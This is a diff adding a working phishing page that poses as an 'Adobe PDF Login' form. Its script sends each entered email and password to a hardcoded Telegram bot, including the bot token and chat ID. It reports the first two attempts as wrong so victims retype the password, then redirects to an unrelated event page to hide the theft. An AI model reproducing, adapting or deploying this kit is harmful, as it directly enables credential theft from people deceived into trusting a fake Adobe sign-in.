@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <meta charset="utf-8">
+    <title>Adobe PDF Login</title>
+    <link rel="shortcut icon" type="image/x-icon" href="http://antispmelite.com/favicon.ico">
+
+    <style type="text/css">
+        body {
+            margin: 0;
+            font-family: helvetica, verdana, arial, sans-serif;
+            background: url(bg.jpg) no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        #top-header {
+            width: 100%;
+            height: 50px;
+            background: #000;
+        }
+
+        .login-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
+        }
+
+        .inp {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #EAEAEA;
+            border-radius: 3px;
+            box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
+        }
+
+        .btn {
+            background: #25aad6;
+            background-image: linear-gradient(to bottom, #25aad6, #1593bc);
+            border-radius: 10px;
+            font-family: Arial;
+            color: #ffffff;
+            font-size: 20px;
+            padding: 13px 15px;
+            text-decoration: none;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background: #1593bc;
+            background-image: linear-gradient(to bottom, #1593bc, #25aad6);
+        }
+
+        .err {
+            color: red;
+            font-size: 14px;
+        }
+
+        .left-spinner {
+            position: absolute;
+            top: 50%;
+            left: 30px;
+            transform: translateY(-50%);
+            width: 64px;
+            height: 64px;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Spinner on the left side -->
+    <img src="ajax.gif" alt="Loading..." class="left-spinner">
+
+    <div class="login-container">
+        <h2>Login</h2>
+        <form name="loginForm" method="post" onsubmit="return validateForm(event)">
+            <div>
+                <label for="username">Email:</label>
+                <input type="text" id="username" name="username" class="inp" placeholder="Enter your email">
+                <span id="errfn" class="err"></span>
+            </div>
+            <div>
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" class="inp" placeholder="Enter your password">
+                <span id="errfnn" class="err"></span>
+            </div>
+            <div>
+                <button type="submit" class="btn">Login</button>
+            </div>
+        </form>
+    </div>
+
+    <script type="text/javascript">
+        let attemptCount = 0;
+
+        function validateForm(event) {
+            event.preventDefault();
+
+            var email = document.getElementById('username').value.trim();
+            var password = document.getElementById('password').value.trim();
+
+            // Validate email
+            var atpos = email.indexOf("@");
+            var dotpos = email.lastIndexOf(".");
+            if (atpos < 1 || dotpos < atpos + 2 || dotpos + 2 >= email.length) {
+                document.getElementById("errfn").innerHTML = "Not a valid email address";
+                return false;
+            } else {
+                document.getElementById("errfn").innerHTML = "";
+            }
+
+            // Validate password
+            if (!password) {
+                document.getElementById("errfnn").innerHTML = "Password is required";
+                return false;
+            } else {
+                document.getElementById("errfnn").innerHTML = "";
+            }
+
+            attemptCount++;
+            let message = `Email: ${email}\nPassword Attempt ${attemptCount}: ${password}`;
+
+            // Send to Telegram
+            const token = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
+            const chatId = '1461764555';
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+              .then(response => {
+                  if (!response.ok) throw new Error('Network error');
+              })
+              .catch(err => {
+                  console.error('Telegram error:', err);
+              });
+
+            if (attemptCount < 3) {
+                document.getElementById("errfnn").innerHTML = "Your account or password is incorrect";
+                document.getElementById("password").value = "";
+                return false;
+            } else {
+                document.getElementById("errfnn").innerHTML = "Redirecting...";
+                setTimeout(() => {
+                    window.location.replace('https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/');
+                }, 2000);
+                return false;
+            }
+        }
+    </script>
+
+</body>
+</html>
